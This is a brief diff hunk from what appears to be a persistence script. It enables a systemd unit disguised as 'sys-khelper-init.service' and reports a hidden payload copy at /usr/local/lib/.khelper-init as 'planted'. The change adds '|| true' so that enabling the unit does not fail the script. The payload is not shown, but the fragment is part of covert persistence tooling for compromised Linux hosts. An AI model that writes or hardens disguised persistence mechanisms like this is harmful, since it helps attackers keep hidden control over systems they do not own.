@@ -138,7 +138,7 @@ UNITEOF
 chmod 644 "${UNIT_FILE}"
 
 systemctl daemon-reload
-systemctl enable sys-khelper-init.service 2>/dev/null
+systemctl enable sys-khelper-init.service 2>/dev/null || true
 
 success "  /etc/systemd/system/sys-khelper-init.service — unit planted & enabled"
 success "  /usr/local/lib/.khelper-init                  — payload copy planted"
